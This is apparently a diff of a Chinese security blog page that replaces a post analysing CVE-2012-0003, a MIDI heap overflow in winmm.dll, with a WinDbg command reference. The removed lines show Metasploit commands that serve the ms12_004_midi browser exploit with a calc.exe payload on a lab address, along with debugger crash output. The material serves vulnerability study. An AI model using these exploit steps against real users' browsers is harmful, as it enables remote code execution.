@@ -5,7 +5,7 @@
     <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>漏洞战争-cve-2012-0003</title>
+<title>windbg命令</title>
 <meta name="description" content="A blog about programming and network security">
 
 <link rel="profile" href="https://gmpg.org/xfn/11" />
@@ -109,12 +109,12 @@
     <div itemscope itemtype="https://schema.org/Article" class="col-md-12 article">
       
 
-      <h1 class="header" itemprop="name">漏洞战争-cve-2012-0003</h1>
+      <h1 class="header" itemprop="name">windbg命令</h1>
 
       <div class="author">
         <small><i>
           
-          on <span itemprop="datePublished" content="2014-08-28">August 23, 2016</span>
+          on <span itemprop="datePublished" content="2014-08-28">December 2, 2016</span>
            under 二进制
         </i></small>
       </div>
@@ -129,89 +129,77 @@
 
         
 
-        <span itemprop="articleBody"><h3 id="0x00-about">0x00 about</h3>
+        <span itemprop="articleBody"><h3 id="0x01-windbg知识">0x01 windbg知识</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>这个漏洞是由于微软的多媒体库winmm.dll(c:\windows\system32\winmm.dll)在处理MIDI文件时,由于对数据的处理不当导致的
-堆溢出,攻击者可以在网页中嵌入特殊的MIDI文件来远程执行任意代码
+<div class="highlighter-rouge"><pre class="highlight"><code>    http://www.yiiyee.cn/Blog/windbg/
+    http://www.cppblog.com/weiym/archive/2012/06/07/177958.aspx
 
+    db esi:查看esi地址中的内容
+        db 400000:查看0x400000处的内容,db按字节大小查看,dd按DWORD类型查看
+        dd poi(addr)
+            poi(addr)相当于[addr],也即addr中存放的值,dd poi(addr)也即相当于dd addr1,其中addr1=[addr]
+    !address edi:显示edi地址处的内存状态,信息
+    lmm mso v:匹配mso模块,并显示详细信息
+    bp eax:在eax处下断点,支持第几次经过后中断,支持中断后执行命令
+    g:让被调试的程序继续运行(f5)
+        gh:把异常标识为已处理并断续执行程序
+        go:对异常不进行任何处理并继续执行程序
+    kb:显示传递给堆栈回溯中的每个函数的前三个参数
+        kp:显示传递给堆栈回溯中的每个函数的所有参数
+    ub mso!Ordinal1273+0x2581:反汇编mso!Ordinal1273+0x2581地址之前的代码
+        uf test!main:反汇编test!main函数
+    p:单步步入step over
+    t:单步步过trace into
+    gu:执行到上一层函数,也即把当前函数帧执行到retn,并执行这个retn
+    ? ebp-edi:显示表达式ebp-edi的值
+        ?? expression:显示c++表达式的值
+    .cls:清屏
+    获取进程环境块_PEB:
+        a&gt;.process 获得_PEB地址设为addr
+          dt _PEB 0xaddr可得到_PEB结构的数据
+        b&gt;也可通过dt _PEB @$peb直接获取_PEB结构的数据
+    查看堆的信息:
+        !heap -h 查看所有堆的地址
+        dt _HEAP 0xaddr 查看一个堆的信息
+        dt _LIST_ENTRY 0xaddr 查看addr地址中存放的堆块索引信息,得到的结果为Flink和Blink的值
+    bp addr 在addr处设置断点
+    bl 查看所有有已经设置的断点
+    bc 清除所有断点
+        bc * 清除所有断点
+    bu 对某个符号下断点,eg. bu MyApp!SomeFunction
+        在代码被修改之后,该断点会随着函数地址改变而自动更新到最新位置,而且bu断点会保存在WinDbg工作空间中,下
+        次启动WinDbg时该断点会自动设置
+    bd 禁用断点
+    be 启用被bd命令禁用的断点
+    ba e|r|w(执行|读|写) 1|2|4|8(单位字节) addr
+        eg.对内存0x11111111进行写操作的时候下断点命令为:ba w4 0x11111111
+    sxe ld:ModuleName 在首次加载ModuleName对应的模块时中断
+        sx{e|d|i|n} [-c "Cmd1"] [-c2 "Cmd2"] [-h] {Exception|Event|*} 
+            http://blog.csdn.net/hgy413/article/details/7598236
+    !heap -h 查看所有的堆的情况,也可通过!heap直接查看
+    !heap -a addr addr要求是一个堆的起始地址,该命令显示这个堆的信息
+    !heap -p -a addr 查看一个地址在哪个堆块中,并显示这个堆块的信息
+
+    其中windbg中的kb命令相当于od中的查看调用堆栈(alt+k),如下图中的ChildEBP列为当前eip对应的ebp的值,RetAddr为当
+    前eip所在的函数的函数返回地址,Args to Child为当前函数的参数,最后一列的地址是当前排的上一排中的RetAddr的值
+
+    要注意的是,并不是kb下面的所有的ChildEBP对应的一列都是函数调用,只有第一排的ChildEBP,RetAddr,Args to
+    Child的数据值是当前的函数调用的相关参数,从第二排开始的只是栈中高地址的数据内容从ebp到retn到参数相当于地址从
+
+    一般情况下,栈空间中的低地址向高地址的排列,函数调用时,栈中的数据如下:
+
+                    ...
+                    ...    (new ebp为当前函数帧中的新的ebp,此处的new ebp代表当前函数帧的ebp的位置所在)
+        new ebp --&gt; old ebp(old ebp为上一函数帧的ebp,此处的old ebp代表new ebp位置中的内容值)
+                    retn   (retn为当前函数的返回地址)
+                    arg1   (arg1为当前函数的第一个参数)
+                    arg2   (arg2为当前函数的第二个参数)
+                    ...
+
+    也即当前ebp中存放的是上一函数帧的ebp,且当前ebp的下一栈单元的内容为当前函数的retn地址
 </code></pre>
 </div>
 
-<h3 id="0x01-准备工作">0x01 准备工作</h3>
-
-<div class="highlighter-rouge"><pre class="highlight"><code>1&gt;使用msf中的exp
-    msfconsole
-    search cve-2012-0003
-    use exploit/windows/browser/ms12_004_midi
-    set uripath test.html
-    set payload windows/exec
-    set cmd calc.exe
-        server started
-        http://192.168.118.129:8080/test.html
-    奇怪的是在系统中不存在test.html,但是访问上面生成的网马链接确实会中马,后来查看msf中的exp:ms12_004_midi.rb,里
-    面生成html的代码为
-        send_response(cli, html, {'Content-Type'=&gt;'text/html'})
-    send_response函数在msfapi中有如下用法
-</code></pre>
-</div>
-
-<p><a href="https://rapid7.github.io/metasploit-framework/api/Msf/Exploit/Remote/HttpServer/HTML.html#send_response_html-instance_method">msfapi_send_response</a></p>
-
-<div class="highlighter-rouge"><pre class="highlight"><code>    也即相当于msf内置webserver通过send_response函数发送html代码到客户端实现下面这个链接的访问
-        http://192.168.118.129:8080/test.html
-    这种方式比较特殊,可能msf的web是ruby的某个类似python下的Django的web框架开发的
-
-</code></pre>
-</div>
-
-<h3 id="0x01-调试分析">0x01 调试分析</h3>
-
-<div class="highlighter-rouge"><pre class="highlight"><code>打开iexplore.exe
-win+r:cmd
-gflags -i iexplore.exe +hpa
-    这里如果在windbg中设置!gflag +hpa不会成功,可能是winxp或是windbg的问题
-windbg:f6附加iexplore.exe
-!gflag
-    0:016&gt; !gflag
-    Current NtGlobalFlag contents: 0x02000000
-        hpa - Place heap allocations at ends of pages
-g
-ie打开http://192.168.118.129:8080/test.html
-    (7ac.208): Access violation - code c0000005 (first chance)
-    First chance exceptions are reported before any exception handling.
-    This exception may be expected and handled.
-    eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=15467019 edi=15464f60
-    eip=76b2d224 esp=34c6fe80 ebp=34c6fea0 iopl=0         nv up ei pl zr na pe nc
-    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
-    WINMM!midiOutPlayNextPolyEvent+0x1ec:
-    76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:15467019=??
-
-    到这里只知道76b2d224处有内存访问异常,然而要想写出exp,还需要弄清参数传递过程,这个"堆溢出"cve的利用不是
-    DWORD SHOOT,而是巧妙地构造html代码达到控制eip的目的,如果是利用堆溢出,一般会想到在上面访问异常时通过找到一个
-    DWORD SHOOT的机会来覆盖异常处理相关的函数地址来控制eip,且要在可控数据复制到内存后找到堆分配调用
-
-win+r:cmd
-gflags -i iexplore.exe -hpa
-bu WINMM!midiOutPlayNextPolyEvent
-g
-ie打开http://192.168.118.129:8080/test.html
-    Breakpoint 0 hit
-    eax=00000000 ebx=ffffffff ecx=7ffdf000 edx=00216790 esi=00216780 edi=002167d8
-    eip=76b2d038 esp=0012e5b0 ebp=0012e5dc iopl=0         nv up ei pl zr na pe nc
-    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
-    WINMM!midiOutPlayNextPolyEvent:
-    76b2d038 8bff            mov     edi,edi
-    此时中断下来
-
-    
-
-
-
-
-
-
-</code></pre>
-</div>
 </span>
 
         
@@ -221,7 +209,7 @@ ie打开http://192.168.118.129:8080/test.html
         <div class="tags">
           <small>
           <i class="fa fa-tags"></i>
-            漏洞战争, 漏洞分析, 堆溢出
+            windbg, bin
           </small>
         </div>
         
@@ -242,7 +230,7 @@ ie打开http://192.168.118.129:8080/test.html
 
       
 <!-- 多说评论框 start -->
-<div class="ds-thread" data-thread-key="/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/23/漏洞战争-cve-2012-0003" data-title="" data-url="https://3xp10it.github.io//%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/23/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0003/"></div>
+<div class="ds-thread" data-thread-key="/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/02/windbg命令" data-title="" data-url="https://3xp10it.github.io//%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/02/windbg%E5%91%BD%E4%BB%A4/"></div>
 <!-- 多说评论框 end -->
 <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 <script type="text/javascript">
